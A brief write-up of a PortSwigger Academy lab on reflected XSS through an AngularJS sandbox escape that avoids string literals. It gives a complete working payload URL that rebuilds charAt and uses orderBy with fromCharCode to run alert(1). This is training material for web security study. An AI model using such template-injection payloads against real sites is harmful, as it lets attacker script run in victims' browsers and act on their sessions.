# Lab: Reflected XSS with AngularJS sandbox escape without strings

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

## Lab idea

The lab uses AngularJS in an unusual configuration where common expression capabilities and string use are restricted. It practices understanding framework expression evaluation and evaluating the limits of client-side sandboxing.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
2. The exploit uses toString() to create a string without using quotes.

## Payloads / key values
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
- `toString()`
- `String`
- `charAt`
- `orderBy`
- `fromCharCode`
- `x=alert(1)`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
